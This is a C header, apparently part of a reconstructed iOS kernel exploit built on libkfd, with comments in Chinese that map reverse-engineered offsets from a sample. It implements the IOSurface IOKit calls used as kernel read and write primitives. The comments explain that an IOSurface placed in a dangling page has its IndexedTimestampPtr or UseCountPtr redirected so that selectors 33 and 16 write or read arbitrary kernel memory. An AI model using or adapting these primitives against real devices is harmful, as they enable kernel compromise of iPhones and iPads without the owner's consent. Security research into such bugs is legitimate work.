/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 *
 * IOSurface_shared.h
 *
 * IOSurface / IOKit 通道。样本 kread_IOSurface 后端用它把 IOSurface 对象
 * 放进 PUAFF 制造的悬空页里，再改对象字段拿任意读写。
 *
 * 与样本的对应（字符串池实测）：
 *     "IOSurfaceRoot"              0x101CBA303
 *     "IOSurface_shared.h"         0x101CBA340
 *     "kr == KERN_SUCCESS"         0x101CBA380
 *     "create_surface_fast_path"   0x101CBA3C0
 *     "release_surface"            0x101CBA3E9
 *
 * 导入调用实测（权威符号映射，见 census_final.py）：
 *     0x100f7cb20  bl _IOServiceMatching
 *     0x100f7cb2c  bl _IOServiceGetMatchingService
 *     0x100f7cb60  bl _IOServiceOpen
 *     0x100f7d3d4  bl _IOConnectCallMethod     ← create_surface_fast_path
 *     0x100f7d5f4  bl _IOConnectCallMethod
 *     0x100f7f0d4  bl _IOConnectCallMethod     ← release_surface
 *
 * libkfd 是 header-only，工程只有 KernelMemory.m 一个 include 点，
 * 所以这里同样把实现内联，不建 .c。
 */

#ifndef IOSurface_shared_h
#define IOSurface_shared_h

#include <CoreFoundation/CoreFoundation.h>
#include <IOSurface/IOSurfaceRef.h>
#include <mach/mach.h>
#include <mach/mach_error.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

/// 对齐样本的 IOKit 错误检查：失败只打印一行 mach_error_string。
#define CHECK_IOKIT_ERR(kr, name)                                              \
    do {                                                                       \
        if ((kr) != KERN_SUCCESS) {                                            \
            print_failure("%s : %s (0x%x)", name, mach_error_string(kr), (kr)); \
        }                                                                      \
    } while (0)

typedef mach_port_t io_connect_t;
typedef mach_port_t io_service_t;
typedef mach_port_t io_object_t;

#ifndef IO_OBJECT_NULL
#define IO_OBJECT_NULL 0
#endif

extern const mach_port_t kIOMasterPortDefault;

kern_return_t IOConnectCallMethod(mach_port_t connection, uint32_t selector,
                                  const uint64_t *input, uint32_t inputCnt,
                                  const void *inputStruct, size_t inputStructCnt,
                                  uint64_t *output, uint32_t *outputCnt,
                                  void *outputStruct, size_t *outputStructCnt);
io_service_t IOServiceGetMatchingService(mach_port_t masterPort, CFDictionaryRef matching);
kern_return_t IOServiceOpen(io_service_t service, task_port_t owningTask, uint32_t type,
                            io_connect_t *connect);
kern_return_t IOServiceClose(io_connect_t connect);
kern_return_t IOObjectRelease(io_object_t object);
CFMutableDictionaryRef IOServiceMatching(const char *name);

/*
 * IOConnectCallMethod 创建 IOSurface 时内核回写的缓冲长度。
 * 样本 create_surface_fast_path 用定长栈缓冲（大栈帧 + __stack_chk_guard）。
 */
#define IOSurfaceLockResultSize 0xA68

/// create_surface_fast_path 的入参。PixelFormat 是搜索时的命中判据。
typedef struct IOSurfaceFastCreateArgs {
    u64 IOSurfaceAddress;
    u32 IOSurfaceWidth;
    u32 IOSurfaceHeight;
    u32 IOSurfacePixelFormat;
    u32 IOSurfaceBytesPerElement;
    u32 IOSurfaceBytesPerRow;
    u32 IOSurfaceAllocSize;
} IOSurfaceFastCreateArgs;

/// 写进 IOSurface.PixelFormat 的哨兵值，search 靠它认自己的对象。
#define IOSURFACE_MAGIC 0x1EA5CACE

/// 每个已创建的 IOSurface 只记 (user client port, surface_id)。
struct iosurface_obj {
    io_connect_t port;
    u32 surface_id;
};

/*
 * 全局的 IOSurfaceRoot 连接。对齐 opa334：
 * PUAF 生效期间再调 get_surface_client 在某些设备上会崩，
 * 所以在 kread_IOSurface_init 里就先拿到并一直持有。
 */
static io_connect_t g_surface_connect = 0;

/*
 * 按名字开 IOKit user client。对应样本里那两条 assert。
 */
static inline io_connect_t iokit_get_connection(const char *name, unsigned int type)
{
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                       IOServiceMatching(name));
    assert(service != IO_OBJECT_NULL);

    io_connect_t conn = MACH_PORT_NULL;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), type, &conn);
    assert(kr == KERN_SUCCESS);

    return conn;
}

/// 打开 IOSurfaceRoot —— 样本 init 跑的就是这一条。
static inline io_connect_t get_surface_client(void)
{
    return iokit_get_connection("IOSurfaceRoot", 0);
}

/*
 * 快速路径建 Surface：selector = 6，入参结构 0x20 字节，输出 0xA68 字节。
 * surface_id 从输出的 0x18 处取回。
 */
static inline io_connect_t create_surface_fast_path(io_connect_t surface, u32 *surface_id,
                                                   IOSurfaceFastCreateArgs *args)
{
    io_connect_t conn = surface;

    char output[IOSurfaceLockResultSize] = {0};
    size_t output_cnt = IOSurfaceLockResultSize;

    if (surface == 0) {
        conn = get_surface_client();
    }

    kern_return_t kr = IOConnectCallMethod(conn, 6, NULL, 0,
                                           args, 0x20,
                                           NULL, NULL, output, &output_cnt);
    CHECK_IOKIT_ERR(kr, "create_surface_fast_path");
    assert(kr == KERN_SUCCESS);

    if (surface_id != NULL) {
        *surface_id = *(u32 *)(output + 0x18);
    }

    return conn;
}

/// 释放 Surface：selector = 1，标量入参为 surface_id。
static inline io_connect_t release_surface(io_connect_t surface, u32 surface_id)
{
    io_connect_t conn = surface;

    u64 scalar = (u64)surface_id;
    kern_return_t kr = IOConnectCallMethod(conn, 1, &scalar, 1,
                                           NULL, 0,
                                           NULL, NULL, NULL, NULL);
    CHECK_IOKIT_ERR(kr, "release_surface");
    assert(kr == KERN_SUCCESS);

    return conn;
}

/*
 * 往 Surface 的时间戳表写值：selector = 33，入参 { surface_id, index, value }。
 * 写路径依赖它：先把对象里的 IndexedTimestampPtr 改成目标内核地址，
 * 再调本函数，内核就把 value 写到该地址上。
 */
static inline void set_indexed_timestamp(io_connect_t c, u32 surface_id, u64 index, u64 value)
{
    u64 args[3] = {0};
    args[0] = surface_id;
    args[1] = index;
    args[2] = value;

    kern_return_t kr = IOConnectCallMethod(c, 33, args, 3,
                                           NULL, 0,
                                           NULL, NULL, NULL, NULL);
    CHECK_IOKIT_ERR(kr, "set_indexed_timestamp");
}

/*
 * 读回 Surface 的 use count：selector = 16，标量入参为 surface_id。
 * 这是 kread_IOSurface 的取数通道 —— 调用前把对象里的 UseCountPtr 改成
 * (目标地址 - ReadDisplacement)，内核就会把该地址处的 32 位值带回来。
 *
 * 注意 iOS 16 起这个 userclient 方法被改了：不再是"读一个整数"，
 * 而是返回目标地址处相邻两个 32 位整数之和（见 Vertex README）。
 */
static inline kern_return_t iosurface_get_use_count(io_connect_t c, u32 surface_id, u32 *output)
{
    u64 args[1] = {surface_id};
    u32 outsize = 1;
    u64 out = 0;

    kern_return_t kr = IOConnectCallMethod(c, 16, args, 1,
                                           NULL, 0,
                                           &out, &outsize, NULL, NULL);
    CHECK_IOKIT_ERR(kr, "iosurface_get_use_count");
    assert(kr == KERN_SUCCESS);

    if (output != NULL) {
        *output = (u32)out;
    }
    return kr;
}

#endif /* IOSurface_shared_h */
